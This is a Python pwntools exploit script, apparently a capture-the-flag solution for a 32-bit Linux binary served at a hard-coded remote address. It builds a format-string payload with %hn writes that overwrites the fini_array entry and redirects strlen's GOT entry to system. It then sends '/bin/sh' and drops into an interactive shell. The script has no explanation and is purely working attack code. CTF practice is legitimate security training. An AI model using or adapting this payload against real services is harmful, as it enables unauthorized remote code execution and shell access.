#!/usr/bin/python
#coding:utf-8
from pwn import *
context(log_level = "debug")

io = remote("111.198.29.45", 32398)
#io = process('./pwn2')
context.update(arch = 'i386', os = 'linux')
#gdb.attach(io)
fini_array = 0x08049934	#内容是__do_global_dtors_aux 0x080485a0
start = 0x080484f0		#		
strlen_got = 0x08049a54
system_plt = 0x08048490

io.recv()
payload = 'aa' + p32(fini_array) + p32(strlen_got + 2) + p32(strlen_got) +'%34000c%12$hn' + '%33556c%13$hn' +'%31884c%14$hn'
#io.sendline('aa\x34\x99\x04\x08\x56\x9a\x04\x08\x54\x9a\x04\x08%34000c%12$hn%33556c%13$hn%31884c%14$hn')
io.sendline(payload)
io.recv()
io.sendline('/bin/sh\x00')
io.interactive()

